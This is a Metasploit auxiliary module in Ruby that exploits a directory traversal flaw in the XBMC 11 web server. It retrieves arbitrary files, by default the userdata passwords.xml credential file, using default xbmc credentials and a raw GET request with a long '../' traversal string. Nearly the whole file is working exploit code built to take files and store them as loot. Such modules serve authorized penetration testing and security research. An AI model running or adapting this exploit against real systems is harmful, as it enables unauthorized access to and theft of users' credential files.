##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "XBMC Web Server Directory Traversal",
			'Description'    => %q{
					This module exploits a directory traversal bug in XBMC 11.
					The module can only be used to retrieve files.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'sinn3r', # Used sinn3r's yaws_traversal exploit as a skeleton 
					'Lucas "acidgen" Lundgren IOActive',
					'Matt "hostess" Andreko',
				],
			'References'     =>
				[
					['URL', 'http://forum.xbmc.org/showthread.php?tid=144110&pid=1227348']
				],
			'DisclosureDate' => "Nov 1 2012"
		))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),
				OptString.new('USER', [true, 'The username to use for the HTTP server', 'xbmc']),
				OptString.new('PASS', [true, 'The password to use for the HTTP server', 'xbmc']),
			], self.class)

		deregister_options('RHOST')
	end

	def run_host(ip)
		# No point to continue if no filename is specified
		if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
			print_error("Please supply the name of the file you want to download")
			return
		end

		# Create request
		traversal = "../../../../../../../../.."
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
			'basic_auth' => "#{datastore['USER']}:#{datastore['PASS']}"
		}, 25)

		# Show data if needed
		if res
			if res.code == 200
				vprint_line(res.to_s)
				fname = File.basename(datastore['FILEPATH'])

				path = store_loot(
					'xbmc.http',
					'application/octet-stream',
					ip,
					res.body,
					fname
				)
				print_good("File saved in: #{path}")
			elsif res.code == 401
				print_error("#{rhost}:#{rport} Authentication failed")		
			elsif res.code == 404
				print_error("#{rhost}:#{rport} File not found")
			end
		else
			print_error("HTTP Response failed")
		end
	end
end
